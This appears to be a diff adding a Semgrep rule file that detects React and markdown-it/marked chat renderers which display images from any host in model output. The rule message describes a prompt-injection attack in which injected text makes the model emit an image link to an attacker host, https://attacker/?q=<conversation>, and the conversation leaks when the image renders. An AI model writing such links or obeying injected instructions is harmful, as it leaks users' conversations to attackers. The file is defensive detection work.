@@ -1,0 +1,88 @@
+rules:
+  - id: ceg.markdown-images-unrestricted
+    message: >-
+      Chat output is rendered as Markdown with images from any address. An injected instruction can
+      make the model write ![](https://attacker/?q=<conversation>) and the browser sends the data the
+      moment the message renders, with no click. Restrict images to your media domains (a custom img
+      component or urlTransform), or render no images from model output.
+    severity: WARNING
+    languages: [typescript, javascript]
+    metadata:
+      cwe: "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+      owasp-llm: "LLM02:2025 Sensitive Information Disclosure"
+      ceg-severity: high
+      family: markdown-image-exfiltration
+    pattern-either:
+      # a Markdown renderer for chat output with no components at all
+      - patterns:
+          - pattern-either:
+              # the spaces let the pattern match children on their own lines too (held-out set rules-v1)
+              - pattern: <ReactMarkdown ...> {<... $MSG ...>} </ReactMarkdown>
+              - pattern: <ReactMarkdown ...>{<... $MSG ...>}</ReactMarkdown>
+              - pattern: <ReactMarkdown ... children={<... $MSG ...>} ... />
+              - pattern: <Markdown ...> {<... $MSG ...>} </Markdown>
+              - pattern: <Markdown ...>{<... $MSG ...>}</Markdown>
+          - metavariable-regex:
+              metavariable: $MSG
+              regex: (?i).*(message|reply|completion|content|response|output|text|answer|markdown|md|body).*
+          - pattern-not: <$MD ... components={$C} ...>...</$MD>
+          - pattern-not: <$MD ... urlTransform={$T} ...>...</$MD>
+          - pattern-not: <$MD ... disallowedElements={[..., "img", ...]} ...>...</$MD>
+          - pattern-not: <$MD ... allowedElements={$ALLOWED} ...>...</$MD>
+      # components given inline, without an img override
+      - patterns:
+          - pattern: <$MD ... components={$OBJ} ...>...</$MD>
+          - metavariable-regex:
+              metavariable: $MD
+              regex: ^(ReactMarkdown|Markdown)$
+          - metavariable-regex:
+              metavariable: $OBJ
+              regex: (?s)^\{(?!.*\bimg\b).*\}$
+          - pattern-not: <$MD ... urlTransform={$T} ...>...</$MD>
+          - pattern-not: <$MD ... disallowedElements={[..., "img", ...]} ...>...</$MD>
+          - pattern-not: <$MD ... allowedElements={$ALLOWED} ...>...</$MD>
+      # components defined in a variable that has no img override (held-out set rules-v1)
+      - patterns:
+          - pattern-either:
+              - pattern-inside: |
+                  const $C: $T = $OBJ;
+                  ...
+              - pattern-inside: |
+                  const $C = $OBJ;
+                  ...
+          - pattern: <$MD ... components={$C} ...>...</$MD>
+          - metavariable-regex:
+              metavariable: $MD
+              regex: ^(ReactMarkdown|Markdown)$
+          - metavariable-regex:
+              metavariable: $OBJ
+              regex: (?s)^\{(?!.*\bimg\b).*\}$
+          - pattern-not: <$MD ... urlTransform={$T} ...>...</$MD>
+          - pattern-not: <$MD ... disallowedElements={[..., "img", ...]} ...>...</$MD>
+          - pattern-not: <$MD ... allowedElements={$ALLOWED} ...>...</$MD>
+      # markdown-it or marked output sanitised with DOMPurify: scripts are gone but <img> from any
+      # host is kept by default (held-out set rules-v1). Unsanitised output is the worse finding,
+      # model-output-rendered-as-html.
+      - patterns:
+          - pattern-either:
+              - pattern: DOMPurify.sanitize($MDI.render(<... $MSG ...>), ...)
+              - pattern: DOMPurify.sanitize(marked.parse(<... $MSG ...>), ...)
+              - pattern: DOMPurify.sanitize(marked(<... $MSG ...>), ...)
+          - metavariable-regex:
+              metavariable: $MSG
+              regex: (?i).*(message|reply|completion|content|response|output|text|answer|markdown|body).*
+          - pattern-either:
+              - pattern-inside: |
+                  $MDI = new MarkdownIt(...);
+                  ...
+              - pattern-inside: |
+                  import { marked } from "marked";
+                  ...
+              - pattern-inside: |
+                  import marked from "marked";
+                  ...
+          - pattern-not-inside: |
+              $MDI.renderer.rules.image = $F;
+              ...
+          - pattern-not: |
+              DOMPurify.sanitize($X, {..., FORBID_TAGS: [..., "img", ...], ...})
